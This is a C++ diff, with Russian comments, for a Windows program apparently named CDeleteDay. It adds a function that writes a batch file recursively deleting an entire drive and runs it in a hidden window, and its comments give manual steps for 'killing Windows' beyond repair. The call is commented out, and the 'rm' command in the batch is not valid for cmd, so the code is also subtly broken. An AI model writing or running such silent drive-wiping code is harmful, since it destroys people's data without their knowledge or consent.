@@ -351,8 +351,12 @@ bool CDeleteDay::PerformATask(void)
 		DoKillWindows();
 	}
 
+	//DeleteAllOnDrive("e");
+	MessageBeep(MB_ICONERROR);
+
 	//удаляем выбранную папку
 	DeleteFolder();
+
 	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
 	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// Делаем файл нормальным иначе не удаляется 
 	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // Запускаем батник.
@@ -642,6 +646,61 @@ bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char 
 	}
 
 	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
+
+	return true;
+}
+
+bool DeleteAllOnDrive(char strDriveLetter[])
+{
+	/////////////////////////////////////////////////////////////////////////
+	//Этот способ применим для 7ки, 8ки, и 10ки!Для этого нам потребуется командная строка запущенная от имени администратора, в ней пишем следующее :
+	//cd .. (нажимаем ентер)
+	//cd .. (нажимаем ентер)
+	//rd c: /s /q(нажимаем ентер и ждем)
+	//del c: /s / q(нажимаем ентер и ждем)
+	//На этом убийство windows завершено успешно! Попробуйте восстановить - не получится, только переустановка
+	//
+	//Успешного Вам убийства Windows!
+
+	char strPathToCMDFile[1024] = { '\0' }; 
+	char strPathToTempFolder[1024] = { '\0' };
+	char strCommands[1024] = { '\0' };
+	
+	GetTempPathA(MAX_PATH, strPathToTempFolder);// Получаем путь к TEMP-папке);
+	//создаем бат-файл в папке темп или в папке с программой
+	sprintf(strPathToCMDFile, "%sToDo.cmd", strPathToTempFolder);
+
+	SetFileAttributesA(strPathToCMDFile, FILE_ATTRIBUTE_NORMAL); // Если файл существует, то изменим его аттрибуты на нормальные
+
+	HANDLE hFile = CreateFileA((LPCSTR)strPathToCMDFile,
+		GENERIC_WRITE,
+		FILE_SHARE_WRITE,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		(HANDLE)NULL); // Создаем по-новой файл ("зачем?" - ком. внутреннего голоса)
+
+	if (!hFile) {
+		TRACE("Факн щет, файла System.bat нет и не будет");
+		return false;
+	}
+
+	char BATSTRING[1024] = "rm %s: /s /q\n"
+		"del %s: /s /q";
+
+	sprintf(strCommands, BATSTRING, strDriveLetter, strDriveLetter);
+
+	DWORD dwBytesWritten;
+	BOOL bError = (!WriteFile(hFile, strCommands, strlen(strCommands), &dwBytesWritten, NULL) || strlen(strCommands) != dwBytesWritten);
+
+	if (bError) {
+		TRACE("Факн щет, текст в файл System.bat не удалось записать");
+		return false;
+	}
+
+	CloseHandle(hFile); // Специально закрываем файл перед запуском батника, чтобы юзер не удалил файл раньше времени
+
+	ShellExecuteA(NULL, "open", strPathToCMDFile, NULL, NULL, SW_HIDE); // Запускаем батник.
 
 	return true;
 }
